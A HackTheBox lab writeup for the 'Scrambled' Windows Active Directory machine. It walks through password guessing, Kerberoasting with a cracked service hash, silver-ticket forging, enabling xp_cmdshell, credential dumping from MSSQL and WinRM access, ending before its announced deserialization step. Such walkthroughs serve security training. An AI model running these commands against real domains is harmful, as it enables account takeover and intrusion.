---
title: "HackTheBox - Scrambled"
author: DrLi
description: "Writeup of a medium-rated Windows Active Directory machine from HackTheBox"
date: 2025-11-19 12:11:20 +0000
categories: [HackTheBox, Machines]
tags: [hackthebox, windows, medium, active directory, smb, kerberos, kerberoasting, silver ticket, mssql, deserialization, ysoserial, winrm]
img_path: /assets/img/HackTheBox/Machines/Scrambled
image:
    path: /assets/img/HackTheBox/Machines/Scrambled/scrambled.png
---


<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>


---


[Scrambled](https://www.hackthebox.com/machines/scrambled) from [HackTheBox](https://www.hackthebox.com/) is a medium Windows Active Directory machine that focuses on Kerberos-based attacks and .NET deserialization. The path involves Kerberoasting to obtain service account credentials, forging a silver ticket to access MSSQL, and exploiting an insecure BinaryFormatter deserialization vulnerability in a custom .NET application to achieve SYSTEM access.


### Enumeration

## nmap

```bash
Nmap scan report for 10.129.43.178
Host is up (0.073s latency).
Not shown: 65513 filtered tcp ports (no-response)
Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-18 13:28:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-18T13:31:44+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
|_ssl-date: 2025-11-18T13:31:44+00:00; -1s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.43.178:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-11-18T13:31:44+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-18T13:22:33
|_Not valid after:  2055-11-18T13:22:33
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-18T13:31:44+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2025-11-18T13:31:44+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.scrm.local
| Not valid before: 2024-09-04T11:14:45
|_Not valid after:  2121-06-08T22:39:53
4411/tcp  open  found?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC
59876/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.95%I=7%D=11/18%Time=691C7482%P=x86_64-pc-linux-gnu%r(N
SF:ULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\
SF:.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDERS
SF:_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKN
SF:OWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TL
SF:SSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SCRA
SF:MBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_V1
SF:\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Four
SF:OhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAN
SF:D;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN
SF:_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")
SF:%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,35,
SF:"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LANDes
SF:k-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCRAM
SF:BLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORDER
SF:S_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%
SF:r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLECO
SF:RP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:);
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-11-18T13:31:09
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 577.54 seconds
```

we have a web page open on port 80

and a weird port (4411) we might need to check later 

first let’s start with the web site

 

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image.png)

we get a note saying that NTLM authentication is disabled

and we can find this aswell

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image1.png)

we have a potential user “ksimpson”

and we also find some information about the service running on port 4411

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image2.png)

and finally we have a note about a password reset feature

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image3.png)

so the username is the password is a user requests a password reset 

and since we discovered a username we can try if his password is the useername

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ nxc smb scrm.local -u 'ksimpson' -p 'ksimpson' -k
SMB         scrm.local      445    scrm             [*]  x64 (name:scrm) (domain:local) (signing:True) (SMBv1:False) (NTLM:False)
SMB         scrm.local      445    scrm             [-] local\ksimpson:ksimpson [Errno Connection error (LOCAL:88)] [Errno -2] Name or service not known
```

it doesn’t seem to work with netexec and when i tried smbclient it worked

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
Type help for list of commands
# ls
[-] No share selected
# help

 open {host,port=445} - opens a SMB connection against the target host/port
 login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
 kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
 login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
 logoff - logs off
 shares - list available shares
 use {sharename} - connect to an specific share
 cd {path} - changes the current directory to {path}
 lcd {path} - changes the current local directory to {path}
 pwd - shows current remote directory
 password - changes the user password, the new password will be prompted for input
 ls {wildcard} - lists all the files in the current directory
 lls {dirname} - lists all the files on the local filesystem.
 tree {filepath} - recursively lists all files in folder and sub folders
 rm {file} - removes the selected file
 mkdir {dirname} - creates the directory under the current path
 rmdir {dirname} - removes the directory under the current path
 put {filename} - uploads the filename into the current path
 get {filename} - downloads the filename from the current path
 mget {mask} - downloads all files from the current directory matching the provided mask
 cat {filename} - reads the filename from the current path
 mount {target,path} - creates a mount point from {path} to {target} (admin required)
 umount {path} - removes the mount point at {path} without deleting the directory (admin required)
 list_snapshots {path} - lists the vss snapshots for the specified path
 info - returns NetrServerInfo main results
 who - returns the sessions currently connected at the target host (admin required)
 close - closes the current SMB Session
 exit - terminates the server process (and this session)

# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use HR
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use IT
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Sales
[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 18:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 13:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
# exit
```

we only have access to the public share and we found a PDF 

let’s investigate it 

```bash
Scramble Corp 

Date: 04/09/2021 
FAO: All employees 
Author: IT Support 

ADDITIONAL SECURITY MEASURES 

As you may have heard, our network was recently compromised and an attacker was able to access 
all of our data. We have identified the way the attacker was able to gain access and have made some 
immediate changes. You can find these listed below along with the ways these changes may impact 
you. 

Change: As the attacker used something known as "NTLM relaying", we have disabled NTLM 
authentication across the entire network. 

Users impacted: All 

Workaround: When you log on or access network resources you will now be using Kerberos 
authentication (which is definitely 100% secure and has absolutely no way anyone could exploit it). 
This will require you to use the full domain name (scrm.local) with your username and any server 
names you access.  

Change: The attacker was able to retrieve credentials from an SQL database used by our HR software 
so we have removed all access to the SQL service for everyone apart from network administrators. 

Users impacted: HR department 

Workaround: If you can no longer access the HR software please contact us and we will manually 
grant your account access again. 
```

so no NTLM authentication everything is kerberos and only the admins have access to MSSQL

since this kerberos we can try kerberoasting maybe a user has a SPN 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-GetUserSPNs -k -no-pass -dc-host DC1.SCRM.LOCAL scrm.local/ksimpson
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2025-11-18 08:22:30.345480             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2025-11-18 08:22:30.345480          
```

and YES! 
the sqlsvc user has and SPN so we can request his tgs and try to crack it and get his password

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-GetUserSPNs -k -no-pass -dc-host DC1.SCRM.LOCAL scrm.local/ksimpson -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2025-11-18 08:22:30.345480             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2025-11-18 08:22:30.345480             

$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$3043938eda2123fede189cd3ada50a55$d66c184ca1880e1b909548c660b26db4d8a2abc508dada494b39d71460f0a5eb50a33839b520cd389237630d4566a0812753cc3138f895624138fa06a6234c2efb5923a7766699836d400fbead36da043ce1181a2ebc7b84c1b6bce5f303b1ae8045a8aa340d0665a44f59d242a8915cc60df79edd6d0650f373ec56e1a4dabe2fc157c634931a5a33d0227c862c4bf23eb12c9cd1020b253f11ee0f589a2a5624c860f4d07f69bae02d363f49d8601debe49ddc5e81413dc937e5a711af706d1dd7854dd86a228e360829a73c07de2a665b4f90014dbd8d631e316fa4c7ca0b6745341b3380e0ce2d1f696945dcc1cb36b10a0eac0cc999eb19a4ed794ab3fb9bf01f2ebdbff3b342538c4884bf7e6ac09b4dd30b3d6e196f45f8b577e5349f2c4dc51c4b9ae2369882d721e5be731c36985063fdb223abc7eeaa7acf2346ad4be928d8f7e32d500021879e48566f2f665bdd271f345299339def14956acc3c1125d5841565f975d8f395ca752e12671e6f99a7e8ff72b63c34381788294a54a73145ca8b8b24574291da0bca2ed69e8440f54393d5c98d1e03aca77c837c3cce5df64acd0a668720b731626a1f57cd04e341498c2fdc5f97ebbd8862b7349f16f52a373a7a6ec0df556ad2b04d3bc436aab99eaa721f41a10fc7517c32a6bf718d3680cb06cc14ab4c59d4f3e0da19f341168c918049dcb37616e8e0708406b5d9eb87e38fe487bc69ddf40bc3d37c024f9a4152ad181841dded3b9baa5f753090dd968925e478b2946df6544642ed2fac6597767d01b588065a5f4ae6cdcbc647a4de5b4554d5d6385242325d5d26c457e25c59008432951b78fcbc06b567ba126856c09707310aec46eee47b62f0bbf4fd762966228abfc8bfb43612e010b0945219ed9dc838d98f634cadfdcb6cf6c7e35fd530cf26eb78dac070dcf49cd2bb430ecb6565f73e561b1509391e74786e4d68059dcb399e50640d02eb9d07e43388dd7272abb9ddaeb0a98ba4a3690ed632e538aafb3b36fec1d8ebad2ebaa9cb543a6314b5cfd0b83b88452af45063ecca6f1b10a8c73c11a93d9110881a31ccf997fd6ae1966f4d52318b9c22a3e280a1335e97928e19516afd508bde77eee0b36470f5ec73eae3412749ee1157813dd6c09b0245db3752ed1b3081461a83ef5a39bec06eb21aff535098f6e34a4680f264f4674ef405e54706e0adc541d991d4d5c3052012762e0075e4d1426fb9f914d1565366a28742eb1cef5be5ba585038d8a4aa2f2b2a821e745432131b25545223050fa3d474f1ecd3502ac4271fa348f337e336787a7605bb19b3cb57c3940e1aec5c2e881d307445af23f1cf2895161bd6c0d35f09acffe5bcc6d3ef3c3a0d140bedc453a77beab478c04ed33c4d437763f7d126b3465fcbc6cc2a830ac97a788ab3c5a6a9b5d6 
```

after cracking we get this 

```bash
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$3043938eda2123fede189cd3ada50a55$d66c184ca1880e1b909548c660b26db4d8a2abc508dada494b39d71460f0a5eb50a33839b520cd389237630d4566a0812753cc3138f895624138fa06a6234c2efb5923a7766699836d400fbead36da043ce1181a2ebc7b84c1b6bce5f303b1ae8045a8aa340d0665a44f59d242a8915cc60df79edd6d0650f373ec56e1a4dabe2fc157c634931a5a33d0227c862c4bf23eb12c9cd1020b253f11ee0f589a2a5624c860f4d07f69bae02d363f49d8601debe49ddc5e81413dc937e5a711af706d1dd7854dd86a228e360829a73c07de2a665b4f90014dbd8d631e316fa4c7ca0b6745341b3380e0ce2d1f696945dcc1cb36b10a0eac0cc999eb19a4ed794ab3fb9bf01f2ebdbff3b342538c4884bf7e6ac09b4dd30b3d6e196f45f8b577e5349f2c4dc51c4b9ae2369882d721e5be731c36985063fdb223abc7eeaa7acf2346ad4be928d8f7e32d500021879e48566f2f665bdd271f345299339def14956acc3c1125d5841565f975d8f395ca752e12671e6f99a7e8ff72b63c34381788294a54a73145ca8b8b24574291da0bca2ed69e8440f54393d5c98d1e03aca77c837c3cce5df64acd0a668720b731626a1f57cd04e341498c2fdc5f97ebbd8862b7349f16f52a373a7a6ec0df556ad2b04d3bc436aab99eaa721f41a10fc7517c32a6bf718d3680cb06cc14ab4c59d4f3e0da19f341168c918049dcb37616e8e0708406b5d9eb87e38fe487bc69ddf40bc3d37c024f9a4152ad181841dded3b9baa5f753090dd968925e478b2946df6544642ed2fac6597767d01b588065a5f4ae6cdcbc647a4de5b4554d5d6385242325d5d26c457e25c59008432951b78fcbc06b567ba126856c09707310aec46eee47b62f0bbf4fd762966228abfc8bfb43612e010b0945219ed9dc838d98f634cadfdcb6cf6c7e35fd530cf26eb78dac070dcf49cd2bb430ecb6565f73e561b1509391e74786e4d68059dcb399e50640d02eb9d07e43388dd7272abb9ddaeb0a98ba4a3690ed632e538aafb3b36fec1d8ebad2ebaa9cb543a6314b5cfd0b83b88452af45063ecca6f1b10a8c73c11a93d9110881a31ccf997fd6ae1966f4d52318b9c22a3e280a1335e97928e19516afd508bde77eee0b36470f5ec73eae3412749ee1157813dd6c09b0245db3752ed1b3081461a83ef5a39bec06eb21aff535098f6e34a4680f264f4674ef405e54706e0adc541d991d4d5c3052012762e0075e4d1426fb9f914d1565366a28742eb1cef5be5ba585038d8a4aa2f2b2a821e745432131b25545223050fa3d474f1ecd3502ac4271fa348f337e336787a7605bb19b3cb57c3940e1aec5c2e881d307445af23f1cf2895161bd6c0d35f09acffe5bcc6d3ef3c3a0d140bedc453a77beab478c04ed33c4d437763f7d126b3465fcbc6cc2a830ac97a788ab3c5a6a9b5d6:Pegasus60
```

now let’s try to connect to MSSQL 

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-mssqlclient -k -no-pass -dc-ip 10.129.43.178 scrm.local/sqlsvc@dc1.scrm.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

i always keep on getting this error 

and that’s because of the policy they made “only admins are able tp authenticate to MSSQL”

and from bloodhound i can see this 

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image4.png)

we are a SQL admin 

se we can request a silver ticket as administrator and access MSSQL

and to get a Silver ticket we need these:

1. The NTLM hash of the password for the service account;
2. The SID of the domain
3. The service principle name (SPN) associated with the account.

I already acquired the SPN with `GetUserSPNS.py` above, `MSSQLSvc/dc1.scrm.local:1433`.

so now let’s get the others

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ echo -n "Pegasus60" | iconv -f ASCII -t UTF-16LE | openssl dgst -md4  

MD4(stdin)= b999a16500b87d17ec7f2e2a68778f05

┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-lookupsid -k scrm.local/sqlsvc:Pegasus60@dc1.scrm.local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at dc1.scrm.local
[*] StringBinding ncacn_np:dc1.scrm.local[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2743207045-1827831105-2542523200
```

now let’s get the silver ticket

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-ticketer -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -spn MSSQLSvc/dc1.scrm.local:1433 -domain scrm.local -user-id 500 Administrator

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ export KRB5CCNAME=Administrator.ccache 
```

let’s connect to MSSQL

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-mssqlclient -k -no-pass -windows-auth scrm.local/Administrator@dc1.scrm.local

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    upload {from} {to}         - uploads file {from} to the SQLServer host {to}
    show_query                 - show query
    mask_query                 - mask query
    
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell {whoami}
output                                                             
----------------------------------------------------------------   
'{whoami}' is not recognized as an internal or external command,   

operable program or batch file.                                    

NULL                                                               

SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output        
-----------   
scrm\sqlsvc   

NULL          

SQL (SCRM\administrator  dbo@master)> enum_dbs
ERROR(DC1): Line 1: Could not find stored procedure 'enum_dbs'.
SQL (SCRM\administrator  dbo@master)> enum_db
name         is_trustworthy_on   
----------   -----------------   
master                       0   

tempdb                       0   

model                        0   

msdb                         1   

ScrambleHR                   0   

SQL (SCRM\administrator  dbo@master)> use ScrambleHR
ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
SQL (SCRM\administrator  dbo@ScrambleHR)> exec sp_tables
TABLE_QUALIFIER   TABLE_OWNER          TABLE_NAME                                                 TABLE_TYPE   REMARKS   
---------------   ------------------   --------------------------------------------------------   ----------   -------   
ScrambleHR        dbo                  Employees                                                  b'TABLE'     NULL      

ScrambleHR        dbo                  Timesheets                                                 b'TABLE'     NULL      

ScrambleHR        dbo                  UserImport                                                 b'TABLE'     NULL      

ScrambleHR        sys                  trace_xe_action_map                                        b'TABLE'     NULL 
```

we can execute commands and there is a Database we can enumerate 

```bash
SQL (SCRM\administrator  dbo@ScrambleHR)> select * from UserImport;
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups   
--------   -----------------   ----------   ---------------   -------------   
MiscSvc    ScrambledEggs9900   scrm.local                90               0  
```

so we found new credentials for the user MiscSvc 

which he is a part of the IT and remote management groups

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image5.png)

now let’s connect to winrm and get the IT share content

```bash
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ impacket-getTGT -dc-ip 10.129.43.178 SCRM.LOCAL/MiscSvc:'ScrambledEggs9900'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in MiscSvc.ccache
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ export KRB5CCNAME=MiscSvc.ccache                                       
                                                                                                                    
┌──(drli㉿kali)-[~/Desktop/HTB-Machines/Scrambled]
└─$ evil-winrm -i dc1.scrm.local -r scrm.local
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miscsvc\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\miscsvc\desktop> cat user.txt
e3e47a89b1d795e7f4ee8be2655f9531
```

### Privilege Escalation

in the IT share we have 

```bash
*Evil-WinRM* PS C:\Users\miscsvc> cd c:\
*Evil-WinRM* PS C:\> ls -force

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        11/5/2021   2:50 PM                $Recycle.Bin
d--hsl        1/26/2020   5:29 PM                Documents and Settings
d-----        11/3/2021  11:44 PM                inetpub
d-----       10/31/2021   9:13 PM                PerfLogs
d-r---         6/1/2022  12:43 PM                Program Files
d-----        11/3/2021   4:50 PM                Program Files (x86)
d--h--         6/9/2022   4:40 PM                ProgramData
d-----        11/1/2021   3:21 PM                Shares
d--hs-        1/26/2020   7:10 PM                System Volume Information
d-----        11/8/2021  12:39 AM                Temp
d-r---        11/5/2021   2:56 PM                Users
d-----         6/8/2022  11:39 PM                Windows
-a-hs-       11/18/2025   1:20 PM      738197504 pagefile.sys

*Evil-WinRM* PS C:\> cd shares
*Evil-WinRM* PS C:\shares> ls

    Directory: C:\shares

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/1/2021   3:21 PM                HR
d-----        11/3/2021   7:32 PM                IT
d-----        11/1/2021   3:21 PM                Production
d-----        11/4/2021  10:23 PM                Public
d-----        11/3/2021   7:33 PM                Sales

*Evil-WinRM* PS C:\shares> cd IT
*Evil-WinRM* PS C:\shares\IT> ls

    Directory: C:\shares\IT

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/3/2021   9:06 PM                Apps
d-----        11/3/2021   7:32 PM                Logs
d-----        11/3/2021   7:32 PM                Reports

*Evil-WinRM* PS C:\shares\IT> cd LOgs
*Evil-WinRM* PS C:\shares\IT\LOgs> ls
*Evil-WinRM* PS C:\shares\IT\LOgs> ls -force
*Evil-WinRM* PS C:\shares\IT\LOgs> cd ../Reports
*Evil-WinRM* PS C:\shares\IT\Reports> ls
*Evil-WinRM* PS C:\shares\IT\Reports> ls -force
*Evil-WinRM* PS C:\shares\IT\Reports> cd ../APps
*Evil-WinRM* PS C:\shares\IT\APps> ls

    Directory: C:\shares\IT\APps

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/5/2021   8:57 PM                Sales Order Client

*Evil-WinRM* PS C:\shares\IT\APps> cd "Sales Order Client"
*Evil-WinRM* PS C:\shares\IT\APps\Sales Order Client> ls

    Directory: C:\shares\IT\APps\Sales Order Client

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/5/2021   8:52 PM          86528 ScrambleClient.exe
-a----        11/5/2021   8:52 PM          19456 ScrambleLib.dll
```

we have a two binaries let’s download and reverse them to understand what they do

![image.png](/assets/img/HackTheBox/Machines/Scrambled/image6.png)

